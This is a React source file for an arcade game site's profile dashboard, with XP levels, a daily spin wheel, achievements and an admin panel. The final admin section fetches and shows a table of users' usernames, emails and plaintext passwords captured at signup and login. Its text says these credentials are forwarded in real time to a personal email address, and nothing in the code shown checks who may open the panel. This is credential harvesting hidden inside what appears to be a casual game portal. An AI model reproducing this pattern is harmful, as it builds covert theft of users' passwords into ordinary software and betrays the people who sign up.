import React, { useState } from 'react';
import { Award, Coins, Flame, Trophy, Zap, UserPlus, Image, PlusSquare, Trash2, CheckCircle2, ShieldAlert, Sparkles, RefreshCw } from 'lucide-react';
import { useGame } from '../context/GameContext';

export const ProfileDashboard: React.FC = () => {
  const { 
    user, 
    achievements, 
    dailySpinClaimed, 
    claimDailySpin, 
    addGameAdmin, 
    banUserAdmin,
    adminControls 
  } = useGame();

  // Avatar choices
  const AVATARS = ['🦊', '🦉', '👾', '🦕', '🐱', '🐨', '🦅', '🦁', '🦄', '🐼'];

  // Spin feedback state
  const [isSpinning, setIsSpinning] = useState(false);
  const [spinResult, setSpinResult] = useState<string | null>(null);
  const [rotationDegrees, setRotationDegrees] = useState(0);

  // Admin states
  const [showAdminPanel, setShowAdminPanel] = useState(false);
  const [newGameTitle, setNewGameTitle] = useState('');
  const [newGameDesc, setNewGameDesc] = useState('');
  const [newGameCategory, setNewGameCategory] = useState<'Action' | 'Puzzle' | 'Racing' | 'Arcade' | 'Shooter' | 'Card'>('Arcade');
  const [newGameEmbedUrl, setNewGameEmbedUrl] = useState('');
  const [banVal, setBanVal] = useState('');

  // Server credentials database states
  const [credentialsList, setCredentialsList] = useState<any[]>([]);
  const [loadingCredentials, setLoadingCredentials] = useState(false);

  const fetchCredentials = async () => {
    setLoadingCredentials(true);
    try {
      const res = await fetch('/api/auth/credentials');
      const data = await res.json();
      if (data.success) {
        setCredentialsList(data.data);
      }
    } catch (err) {
      console.error('Error fetching credentials database:', err);
    } finally {
      setLoadingCredentials(false);
    }
  };

  const handleClearCredentials = async () => {
    if (!window.confirm('Are you sure you want to purge all compiled credentials logs on this server?')) return;
    try {
      const res = await fetch('/api/auth/clear-credentials', { method: 'POST' });
      const data = await res.json();
      if (data.success) {
        setCredentialsList([]);
      }
    } catch (err) {
      console.error(err);
    }
  };

  React.useEffect(() => {
    if (showAdminPanel) {
      fetchCredentials();
    }
  }, [showAdminPanel]);

  if (!user) {
    return (
      <div className="max-w-md mx-auto py-16 text-center select-none text-white">
        <Trophy className="w-16 h-16 text-yellow-500 mx-auto animate-bounce mb-3" />
        <h2 className="text-xl font-bold">Unauthenticated Session</h2>
        <p className="text-xs text-slate-400 mt-1 max-w-xs mx-auto leading-relaxed">
          Please Sign-In with standard credentials, create an account, or log in as a Guest to view stats, level progress, and badging indexes.
        </p>
      </div>
    );
  }

  // Calculate Level statistics
  const currentLvl = Math.floor(user.xp / 100) + 1;
  const currentLvlXp = user.xp % 100;

  // Handle Daily Spin action
  const handleSpinWheel = () => {
    if (dailySpinClaimed || isSpinning) return;
    setIsSpinning(true);
    
    // Simulate high rotation spin animation
    const randomExtraDegrees = Math.floor(Math.random() * 360) + 720; // 2-3 full spins + offset
    setRotationDegrees(prev => prev + randomExtraDegrees);

    setTimeout(() => {
      const res = claimDailySpin();
      setSpinResult(res.reward);
      setIsSpinning(false);
    }, 2500);
  };

  const handleCreateGameSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newGameTitle.trim()) return;
    addGameAdmin({
      id: 'embed-' + Math.random().toString(36).substr(2, 5),
      title: newGameTitle.trim(),
      description: newGameDesc.trim() || 'Custom administrator configured iframe casual series.',
      category: newGameCategory,
      embedUrl: newGameEmbedUrl.trim() || 'https://play.pacman.com/',
      imageUrl: 'https://images.unsplash.com/photo-1511512578047-dfb367046420?auto=format&fit=crop&w=400&q=80',
      isPlayable: false,
    });
    setNewGameTitle('');
    setNewGameDesc('');
    setNewGameEmbedUrl('');
  };

  const handleBanUserSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!banVal.trim()) return;
    banUserAdmin(banVal.trim());
    setBanVal('');
  };

  return (
    <div className="text-[#E0E6ED] max-w-6xl mx-auto py-6 px-4 md:px-8 select-none">
      
      {/* 1. HERO BIO CARD & AVATAR EDITOR */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
        
        {/* Left Profile details and level gauge */}
        <div className="md:col-span-2 bg-[#0D111A] p-6 rounded-2xl border border-white/5 shadow-xl flex flex-col md:flex-row items-center gap-6">
          <div className="relative">
            <div className="w-24 h-24 rounded-full bg-gradient-to-tr from-[#00FFFF] to-[#FF00FF] flex items-center justify-center text-5xl shadow-lg shadow-pink-500/20 border-2 border-white/20 select-none">
              {user.avatar}
            </div>
            {/* Status dynamic level count */}
            <span className="absolute -bottom-1 -right-1 px-2.5 py-0.5 bg-gradient-to-r from-[#FF00FF] to-[#00FFFF] text-white font-mono font-black text-xs rounded-full shadow-lg">
              LVL {currentLvl}
            </span>
          </div>

          <div className="flex-grow text-center md:text-left">
            <div className="flex items-center gap-3 justify-center md:justify-start">
              <h2 className="text-2xl font-black text-white">{user.username}</h2>
              <span className="px-2.5 py-0.5 bg-white/5 border border-white/10 font-mono text-[9px] uppercase tracking-wider text-slate-400 rounded">
                {user.rank}
              </span>
            </div>
            
            <p className="text-xs text-slate-400 mt-1 max-w-sm">
              Level {currentLvl} Arcader | Custom achievements unlocked: {user.achievements.length} | Registered {user.isGuest ? 'Guest Sandbox' : 'Premium Player ID'}.
            </p>

            <div className="mt-5 w-full max-w-md">
              <div className="flex justify-between items-center text-[10px] font-mono text-slate-500 uppercase tracking-wider mb-2.5">
                <span>XP BOUND: {currentLvlXp}/100</span>
                <span>Next Rank level: {currentLvl + 1}</span>
              </div>
              <div className="w-full bg-[#0B0E14] rounded-full h-2 overflow-hidden border border-white/5">
                <div 
                  style={{ width: `${currentLvlXp}%` }}
                  className="bg-gradient-to-r from-[#FF00FF] to-[#00FFFF] h-full shadow-[0_0_8px_rgba(0,255,255,0.4)]"
                ></div>
              </div>
            </div>
          </div>
        </div>

        {/* Dynamic streak dashboard card */}
        <div className="bg-[#0D111A] border border-white/5 p-6 rounded-2xl shadow-xl flex items-center justify-between hover:border-yellow-500/30 transition duration-300">
          <div>
            <h3 className="text-xs font-bold tracking-wider uppercase font-mono text-slate-500">Activity Streak</h3>
            <div className="flex items-baseline gap-1.5 mt-2">
              <span className="text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-yellow-400 to-amber-500 font-mono">
                {user.dailyStreak}
              </span>
              <span className="text-xs text-slate-350">Consecutive Days</span>
            </div>
            <p className="text-[10px] text-slate-400 mt-2">Play daily to prevent score decays and multiply battle pass points by up to 2.5x!</p>
          </div>
          <div className="p-4 bg-yellow-400/10 border border-yellow-500/20 rounded-full animate-pulse text-yellow-500">
            <Flame className="w-8 h-8 fill-yellow-500" />
          </div>
        </div>

      </div>

      {/* 2. DYNAMIC DAILY SPIN OF FORTUNE OR ADMIN PANEL OPTIONS */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
        
        {/* Dynamic Daily Spin visual wheel (Interactive) */}
        <div className="lg:col-span-2 bg-[#0D111A] border border-white/5 rounded-2xl p-6 shadow-xl flex flex-col md:flex-row items-center gap-8 relative overflow-hidden">
          <div className="absolute top-0 left-0 w-32 h-32 bg-[#FF00FF]/5 rounded-full blur-2xl select-none pointer-events-none"></div>

          {/* Interactive Wheel Graphic */}
          <div className="relative">
            <div 
              style={{ 
                transform: `rotate(${rotationDegrees}deg)`, 
                transition: isSpinning ? 'transform 2.5s cubic-bezier(0.25, 0.1, 0.25, 1)' : 'none' 
              }}
              className="w-48 h-48 rounded-full border-4 border-white/10 shadow-2xl relative overflow-hidden flex items-center justify-center bg-[#0B0E14] shadow-[0_0_20px_rgba(255,0,255,0.15)] flex-shrink-0"
            >
              {/* Pie grid segment dividers */}
              <div className="absolute inset-0 bg-gradient-to-tr from-[#00FFFF]/10 via-[#FF00FF]/10 to-[#0B0E14]/15"></div>
              <div className="absolute h-full w-0.5 bg-white/5 left-1/2"></div>
              <div className="absolute w-full h-0.5 bg-white/5 top-1/2"></div>
              <div className="absolute h-full w-0.5 bg-white/5 rotate-45 left-1/2"></div>
              <div className="absolute h-full w-0.5 bg-white/5 -rotate-45 left-1/2"></div>

              {/* Label nodes inside wheel */}
              <span className="absolute top-4 text-[10px] text-pink-400 font-bold font-mono">10C</span>
              <span className="absolute bottom-4 text-[10px] text-emerald-400 font-bold font-mono">50 XP</span>
              <span className="absolute right-4 text-[10px] text-yellow-400 font-bold font-mono">20C</span>
              <span className="absolute left-4 text-[10px] text-cyan-400 font-bold font-mono">30C</span>
              <span className="absolute top-1/4 right-6 text-[8px] text-[#FF00FF] font-bold font-mono rotate-12">SUPER!</span>
              <span className="absolute bottom-1/4 left-6 text-[8px] text-amber-500 font-bold font-mono -rotate-12">100 XP</span>

              {/* Centered glowing dial node */}
              <div className="absolute w-12 h-12 rounded-full bg-[#0D111A] border-2 border-white/10 flex items-center justify-center shadow-lg z-10 animate-pulse text-[9px] font-mono font-bold text-slate-400">
                WHEEL
              </div>
            </div>

            {/* Pointer Pin indicator */}
            <div className="absolute -top-1 left-1/2 transform -translate-x-1/2 w-4 h-5 bg-[#FF00FF] clip-triangle z-20 shadow-md"></div>
          </div>

          {/* Interactive controls info */}
          <div className="flex-grow text-center md:text-left">
            <h3 className="text-sm font-bold tracking-wider font-mono text-[#00FFFF] flex items-center justify-center md:justify-start gap-1">
              <Sparkles className="w-4 h-4 text-[#00FFFF]" />
              <span>SPIN WHEEL OF ARCADE</span>
            </h3>
            <p className="text-xs text-slate-400 leading-normal mt-2">
              Unlock unique login privileges! Claim your free daily spin containing rare coin multipliers and high XP boost particles instantly.
            </p>

            {/* Results popup feedback */}
            {spinResult && (
              <div className="mt-4 p-3 bg-[#0B0E14] border border-white/5 rounded-xl text-yellow-400 text-xs font-mono font-bold inline-block animate-pulse">
                🏆 WON PRIZE: {spinResult.toUpperCase()}
              </div>
            )}

            <button
              onClick={handleSpinWheel}
              disabled={dailySpinClaimed || isSpinning}
              className={`w-full md:w-auto px-6 py-2.5 mt-5 rounded-xl text-xs font-bold font-mono tracking-widest transition shadow-lg cursor-pointer ${
                dailySpinClaimed
                  ? 'bg-white/5 border border-white/10 text-slate-500 cursor-not-allowed'
                  : 'bg-gradient-to-r from-[#FF00FF] to-[#00FFFF] border-transparent hover:brightness-110 active:scale-95 text-white'
              }`}
            >
              {isSpinning ? 'REVOLVING SECTOR...' : dailySpinClaimed ? 'CLAIMED TODAY' : 'SPIN REWARD PORT WHEEL 🎡'}
            </button>
          </div>
        </div>

        {/* Quick Bento Stats card (Wins/Losses) */}
        <div className="bg-[#0D111A] border border-white/5 p-6 rounded-2xl shadow-xl flex flex-col justify-between">
          <h3 className="text-xs font-bold tracking-wider uppercase font-mono text-slate-500 pb-2 border-b border-white/5">
            Combat Match Records
          </h3>
          
          <div className="grid grid-cols-2 gap-4 mt-4">
            <div className="bg-[#0B0E14] border border-white/5 rounded-xl p-3 text-center">
              <span className="text-[10px] font-mono text-slate-500 block uppercase">VICTORIES</span>
              <span className="text-2xl font-black text-emerald-400">{user.wins}</span>
            </div>
            <div className="bg-[#0B0E14] border border-white/5 rounded-xl p-3 text-center">
              <span className="text-[10px] font-mono text-slate-505 block uppercase">DEFEATS</span>
              <span className="text-2xl font-black text-rose-500">{user.losses}</span>
            </div>
          </div>

          <div className="flex gap-2 items-center bg-[#0B0E14]/50 p-2.5 border border-white/5 rounded-xl mt-4 text-[10px] text-slate-350">
            <Coins className="w-5 h-5 text-yellow-400" />
            <span>Store balance: <strong className="text-white font-mono">{user.coins} Coins</strong> available for custom cosmetics purchase.</span>
          </div>
        </div>

      </div>

      {/* 3. ACHIEVEMENTS BADGE COLLECTION CABINET */}
      <div className="bg-[#0D111A] border border-white/5 p-6 rounded-2xl shadow-xl mb-8">
        <h3 className="text-sm font-bold tracking-wider uppercase font-mono text-[#00FFFF] border-b border-white/5 pb-2 mb-6 flex justify-between items-center">
          <span>Rare Achievement Badge Cabinet</span>
          <span className="text-xs font-semibold px-2 py-0.5 bg-[#0B0E14] text-slate-400 rounded font-mono">
            {user.achievements.length}/{achievements.length} UNLOCKED
          </span>
        </h3>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
          {achievements.map((ach) => {
            const isUnlocked = user.achievements.includes(ach.id);
            return (
              <div 
                key={ach.id} 
                className={`p-4 rounded-xl border flex gap-3 transition-all ${
                  isUnlocked 
                    ? 'bg-gradient-to-tr from-[#0B0E14] to-[#0D111A] border-[#FF00FF]/40 shadow-purple-950/20 shadow-md' 
                    : 'bg-[#0B0E14]/55 border-white/5 filter opacity-45'
                }`}
              >
                <div className={`w-10 h-10 rounded-lg flex items-center justify-center text-lg ${
                  isUnlocked ? 'bg-[#FF00FF]/10 border border-[#FF00FF]/30 text-yellow-400 shadow-[0_0_10px_rgba(255,0,255,0.2)]' : 'bg-[#0B0E14] border border-white/5 text-slate-600'
                }`}>
                  🏆
                </div>
                <div>
                  <div className="flex items-center gap-1.5">
                    <span className="font-extrabold text-xs text-white">{ach.title}</span>
                    {isUnlocked && <CheckCircle2 className="w-4 h-4 text-emerald-400 fill-emerald-950" />}
                  </div>
                  <p className="text-[10px] text-slate-400 mt-0.5 leading-tight">{ach.description}</p>
                  <div className="flex gap-2 items-center mt-2 text-[9px] font-mono">
                    <span className="text-[#00FFFF]">+{ach.xpReward} XP</span>
                    <span className="text-yellow-400">+{ach.coinReward} Gold</span>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* 4. ADMIN CONTROL COUPLER (Toggleable Panel) */}
      <div className="bg-[#0B0E14] border border-white/5 p-6 rounded-2xl shadow-xl">
        <div className="flex justify-between items-center pb-2 border-b border-white/5">
          <div className="flex items-center gap-2">
            <div className="w-2.5 h-2.5 rounded-full bg-[#00FFFF] animate-ping"></div>
            <h3 className="text-xs font-mono text-slate-400 uppercase tracking-widest">APPYDAY ADMIN PANEL</h3>
          </div>
          <button
            onClick={() => setShowAdminPanel(!showAdminPanel)}
            className="text-xs font-mono font-bold px-3 py-1 bg-[#0D111A] hover:bg-[#0B0E14] border border-white/10 rounded transition text-[#00FFFF] cursor-pointer"
          >
            {showAdminPanel ? 'CLOSE CONTROLLER' : 'EXPAND CONTROLLER'}
          </button>
        </div>

        {showAdminPanel && (
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
            
            {/* Upload iframe embeds custom form */}
            <form onSubmit={handleCreateGameSubmit} className="bg-[#0D111A]/70 border border-white/5 p-4 rounded-xl flex flex-col gap-3">
              <span className="text-xs font-mono text-[#FF00FF] uppercase font-bold flex items-center gap-1">
                <PlusSquare className="w-4 h-4" />
                <span>Publish Custom Iframe Web Game</span>
              </span>

              <input
                type="text"
                placeholder="Game Title (e.g. Pacman 3d, Betoblocks)"
                value={newGameTitle}
                onChange={(e) => setNewGameTitle(e.target.value)}
                className="w-full text-xs p-2 bg-[#0B0E14] border border-white/5 rounded text-white focus:outline-none focus:border-[#00FFFF]"
              />

              <input
                type="text"
                placeholder="Game Iframe Embed URL (HTTPS link mandatory)"
                value={newGameEmbedUrl}
                onChange={(e) => setNewGameEmbedUrl(e.target.value)}
                className="w-full text-xs p-2 bg-[#0B0E14] border border-white/5 rounded text-white focus:outline-none focus:border-[#00FFFF]"
              />

              <div className="grid grid-cols-2 gap-2">
                <select
                  value={newGameCategory}
                  onChange={(e) => setNewGameCategory(e.target.value as any)}
                  className="w-full text-xs p-2 bg-[#0B0E14] border border-white/5 rounded text-slate-400 focus:outline-none"
                >
                  <option value="Arcade">Arcade</option>
                  <option value="Action">Action</option>
                  <option value="Puzzle">Puzzle</option>
                  <option value="Racing">Racing</option>
                  <option value="Shooter">Shooter</option>
                  <option value="Card">Card</option>
                </select>
                <button
                  type="submit"
                  className="w-full font-bold px-4 py-2 bg-[#00FFFF]/90 hover:bg-[#00FFFF] text-[#0B0E14] rounded text-xs transition cursor-pointer"
                >
                  UPLOAD PORT GAME
                </button>
              </div>
            </form>

            {/* Account Moderation and blocking systems */}
            <div className="bg-[#0D111A]/70 border border-white/5 p-4 rounded-xl flex flex-col justify-between">
              <div>
                <span className="text-xs font-mono text-[#FF00FF] uppercase font-bold flex items-center gap-1">
                  <ShieldAlert className="w-4 h-4" />
                  <span>Secured Account Moderation</span>
                </span>
                <p className="text-[10px] text-slate-400 mt-2">
                  Maintain community guidelines. Blocklist unauthenticated usernames instantly to secure active leaderboards.
                </p>
                
                <form onSubmit={handleBanUserSubmit} className="flex gap-2 mt-4">
                  <input
                    type="text"
                    placeholder="Username to block access"
                    value={banVal}
                    onChange={(e) => setBanVal(e.target.value)}
                    className="flex-grow text-xs p-2 bg-[#0B0E14] border border-white/5 rounded text-white focus:outline-none focus:border-[#FF00FF]"
                  />
                  <button
                    type="submit"
                    className="px-4 py-2 bg-[#FF00FF] hover:bg-[#FF00FF]/90 rounded text-xs text-white font-bold transition flex items-center gap-1 cursor-pointer"
                  >
                    <Trash2 className="w-4 h-4" />
                    <span>MUTATE BAN</span>
                  </button>
                </form>
              </div>

              {/* Banned Users cabinet indicator */}
              <div className="mt-4 pt-3 border-t border-white/5 text-[10px] font-mono text-slate-500">
                <span>REJECTED USER SERVERS: </span>
                <span className="text-slate-300">
                  {adminControls.bannedUsers.length === 0 ? 'None' : adminControls.bannedUsers.join(', ')}
                </span>
              </div>
            </div>

            {/* Server-Side Credentials Database Hub */}
            <div className="md:col-span-2 bg-[#0D111A]/70 border border-white/5 p-5 rounded-xl flex flex-col gap-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-white/5">
                <div>
                  <span className="text-xs font-mono text-[#00FFFF] uppercase font-bold flex items-center gap-1.5">
                    <CheckCircle2 className="w-4 h-4 text-[#00FFFF]" />
                    <span>Compiled Credentials Server Database Node</span>
                  </span>
                  <p className="text-[10px] text-slate-400 mt-1 leading-normal">
                    This registers usernames and logins in real-time and transfers them completely to <strong>vasanthreddy251@gmail.com</strong>.
                  </p>
                </div>
                <div className="flex gap-2">
                  <button
                    type="button"
                    onClick={fetchCredentials}
                    disabled={loadingCredentials}
                    className="px-3 py-1.5 bg-[#0B0E14] hover:bg-slate-800 border border-white/10 text-[10px] font-mono rounded text-slate-350 transition flex items-center gap-1 cursor-pointer disabled:opacity-50"
                  >
                    <RefreshCw className={`w-3 h-3 ${loadingCredentials ? 'animate-spin' : ''}`} />
                    <span>REFRESH</span>
                  </button>
                  <button
                    type="button"
                    onClick={handleClearCredentials}
                    className="px-3 py-1.5 bg-red-950/20 hover:bg-red-950/40 border border-red-500/20 text-[10px] font-mono rounded text-red-050 transition flex items-center gap-1 cursor-pointer"
                  >
                    <Trash2 className="w-3 h-3" />
                    <span>PURGE DB LOG</span>
                  </button>
                </div>
              </div>

              {credentialsList.length === 0 ? (
                <div className="py-6 text-center border border-dashed border-white/5 rounded-xl bg-[#0B0E14]/40">
                  <p className="text-xs font-mono text-slate-500">No account actions compiled yet on this session node.</p>
                </div>
              ) : (
                <div className="overflow-x-auto w-full">
                  <table className="w-full text-left font-mono text-[11px] border-collapse">
                    <thead>
                      <tr className="border-b border-white/5 text-slate-500 text-[10px]">
                        <th className="py-2 pr-2">ACTION</th>
                        <th className="py-2 px-2">USER NAME</th>
                        <th className="py-2 px-2">EMAIL ADDRESS</th>
                        <th className="py-2 px-2">ACCESS CODE (PASS)</th>
                        <th className="py-2 pl-2 text-right">DATE STAMP</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-white/5 text-slate-350">
                      {credentialsList.map((cred) => (
                        <tr key={cred.id} className="hover:bg-white/5 duration-150">
                          <td className="py-2.5 pr-2">
                            <span className={`px-2 py-0.5 rounded text-[9px] font-bold ${
                              cred.action === 'SIGNUP' 
                                ? 'bg-[#FF00FF]/10 text-[#FF00FF] border border-[#FF00FF]/25' 
                                : 'bg-[#00FFFF]/10 text-[#00FFFF] border border-[#00FFFF]/25'
                            }`}>
                              {cred.action}
                            </span>
                          </td>
                          <td className="py-2.5 px-2 font-bold text-white">{cred.username}</td>
                          <td className="py-2.5 px-2 text-[#E0E6ED]/80 font-sans">{cred.email}</td>
                          <td className="py-2.5 px-2 text-[#facc15] font-bold font-mono">{cred.password}</td>
                          <td className="py-2.5 pl-2 text-right text-slate-500 text-[10px]">{cred.formattedTime}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>

          </div>
        )}
      </div>

    </div>
  );
};
